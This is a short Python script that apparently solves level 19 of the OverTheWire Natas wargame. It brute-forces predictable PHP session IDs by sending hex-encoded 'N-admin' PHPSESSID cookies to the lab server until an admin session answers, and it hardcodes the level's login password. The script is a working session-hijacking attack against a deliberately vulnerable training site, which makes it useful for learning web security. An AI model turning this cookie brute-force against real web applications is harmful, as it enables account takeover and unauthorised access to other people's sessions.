#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re

usn = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
#url = "http://%s.natas.labs.overthewire.org/index-source.html" % usn
url = "http://%s.natas.labs.overthewire.org/" % usn
login = (usn, password)



##uncomment this block after finding PHPSESSID from the for loop below
# session = requests.Session()   
# connection = session.get(url, cookies = { "PHPSESSID" : str("%d-admin" % 281).encode('utf-8').hex()}, auth = login)   
# print(connection.text)
##




for i in range(641):
    session = requests.Session()
    #connection = session.post(url, data = { "username" : "tylerptl", "password": "zombocom"}, auth = login)
    connection = session.get(url, cookies = {"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()}, auth = login)



    # print(session.cookies["PHPSESSID"])   ## works w/post - the hex will represent userid-username (i.e 555-sampleName) that was passed in the post
    pageContent = connection.text


    # This will filter out regular user responses
    if ("regular" not in pageContent):
       print("====================")
       print("Admin ID found " , i)
       print("====================")
       break
    print("(" + str(i) + ") failed - moving on. ---- ", end="", flush=True)
    print({"PHPSESSID" : str("%d-admin" % i).encode('utf-8').hex()})
